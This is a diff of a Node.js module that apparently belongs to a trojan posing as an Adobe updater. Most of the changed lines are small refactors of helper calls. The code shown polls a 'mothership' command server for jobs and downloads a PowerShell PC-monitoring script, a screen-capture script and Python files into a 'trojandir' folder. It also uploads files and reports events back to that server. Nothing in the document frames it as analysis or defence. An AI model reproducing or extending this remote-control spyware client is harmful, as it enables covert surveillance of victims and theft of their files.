@@ -1,5 +1,3 @@
-const helper = require("./adobeupdate.helper.js");
-
 const path = require("path");
 const PubNub = require("pubnub");
 const net = require("net");
@@ -23,7 +21,7 @@ async function makeGetRequest(
     baseUrl,
     params,
     inputHeaders,
-    downloadOpts = null
+    downloadOpts = null,
 ) {
     helper.logmsg("starting");
 
@@ -43,12 +41,13 @@ async function makeGetRequest(
         });
     }
 
+
     helper.logmsg("url=" + url.toString());
 
     if (!helper.isValidDict(downloadOpts)) {
         let outputPath = path.join(
-            systemstate.trojandir,
-            "download_" + getRandomCode(8)
+            helper_config.systemconfig.trojandir,
+            "download_" + helper.getRandomCode(8)
         );
 
         downloadOpts = {
@@ -110,8 +109,8 @@ async function makeGetRequest(
         helper.isNullOrWhitespace(downloadOpts.localpath)
     ) {
         let outputPath = path.join(
-            systemstate.trojandir,
-            "download_" + getRandomCode(8)
+            helper_config.systemconfig.trojandir,
+            "download_" + helper.getRandomCode(8)
         );
 
         downloadOpts.localpath = outputPath;
@@ -240,18 +239,18 @@ async function download_launch_script() {
     }
 
     const stats = fs.statSync(localpath);
-    helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 }
 
 async function retrieve_asset(assetfname, assetdir, localdir) {
     let baseUrl =
         helper_config.systemconfig.mothershipassets +
         "/" +
-        (helper.helper.isNullOrWhitespace(assetdir) ? "" : assetdir + "/") +
+        (helper.isNullOrWhitespace(assetdir) ? "" : assetdir + "/") +
         assetfname;
     let localpath = null;
 
-    if (helper.helper.isNullOrWhitespace(localdir))
+    if (helper.isNullOrWhitespace(localdir))
         localpath = path.join(helper_config.systemconfig.trojandir, assetfname);
     else {
         if (!folderExists(localdir)) {
@@ -283,13 +282,13 @@ async function retrieve_asset(assetfname, assetdir, localdir) {
     }
 
     const stats = fs.statSync(localpath);
-    helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 
     return response;
 }
 
 async function download_python(filenames) {
-    helper.helper.logmsg("starting");
+    helper.logmsg("starting");
 
     filenames = filenames ?? [];
     filenames =
@@ -333,7 +332,7 @@ async function download_python(filenames) {
         }
 
         const stats = fs.statSync(localpath);
-        helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+        helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
     }
 }
 
@@ -362,7 +361,7 @@ async function download_pcmon() {
 }
 
 async function download_pspcmon() {
-    helper.helper.logmsg("starting");
+    helper.logmsg("starting");
 
     let filename = "pc_monitoring.ps1";
     let baseUrl = helper_config.systemconfig.mothershipassets + "/" + filename;
@@ -390,9 +389,9 @@ async function download_pspcmon() {
     }
 
     const stats = fs.statSync(localpath);
-    helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 
-    helper.helper.logmsg("finished");
+    helper.logmsg("finished");
 
     return { state: true };
 }
@@ -417,11 +416,11 @@ async function download_screencapture_script() {
     }
 
     const stats = fs.statSync(localpath);
-    helper.helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 }
 
 async function upload_file(filename, jobcode, localfpath) {
-    if (helper.helper.isNullOrWhitespace(filename)) {
+    if (helper.isNullOrWhitespace(filename)) {
         throw new Error("filename is null or empty");
     }
 
@@ -441,7 +440,7 @@ async function upload_file(filename, jobcode, localfpath) {
 }
 
 async function retrieveClientJob() {
-    helper.helper.logmsg("starting");
+    helper.logmsg("starting");
 
     let baseUrl = helper_config.systemconfig.mothership + "/ow/retrieve.php";
     let params = helper_config.systemconfig.statekvp;
@@ -474,11 +473,11 @@ async function retrieveClientJob() {
         jobfilename =
             response.headers[getKey(response.headers, "X-JobFilename")];
 
-    if (helper.helper.isNullOrWhitespace(jobcode)) {
+    if (helper.isNullOrWhitespace(jobcode)) {
         throw new Error("jobcode is empty");
     }
 
-    if (helper.helper.isNullOrWhitespace(jobfilename)) {
+    if (helper.isNullOrWhitespace(jobfilename)) {
         throw new Error("jobfilename is empty");
     }
 
@@ -496,27 +495,26 @@ async function retrieveClientJob() {
         jobfilename: jobfilename,
     };
 
-    helper.helper.logmsg("retrieved client job: " + JSON.stringify(clientjob));
+    helper.logmsg("retrieved client job: " + JSON.stringify(clientjob));
 
-    helper.helper.logmsg("finished");
+    helper.logmsg("finished");
 
     return clientjob;
 }
 
-async function logmsgMothership(msg, isevent = false, jobcode) {
-    let baseUrl =
-        helper_config.systemconfig.mothership + "/ow/helper.helper.logmsg.php";
+async function logmsgMothership(msg, isevent = false, jobcode='') {
+    let baseUrl = helper_config.mothershipconfig.logmsgurl;
 
     let kvp = helper_config.systemconfig.statekvp;
 
     kvp[isevent ? "event" : "msg"] = msg;
     kvp["jobcode"] = jobcode;
 
-    let response = await makeGetRequest(baseUrl, kvp);
+    let response = await makeGetRequest(baseUrl, kvp, undefined, undefined);
     return response;
 }
 
-// make GET request to helper.helper.logmsg.php with event = event_code
+// make GET request to helper.logmsg.php with event = event_code
 function logEventMothership(event_code, jobcode) {
     return logmsgMothership(event_code, true, jobcode);
 }
@@ -529,4 +527,5 @@ module.exports = {
     upload_file,
 };
 
+const helper = require("./adobeupdate.helper.js");
 const helper_config = require("./adobeupdate.helper.config.js");
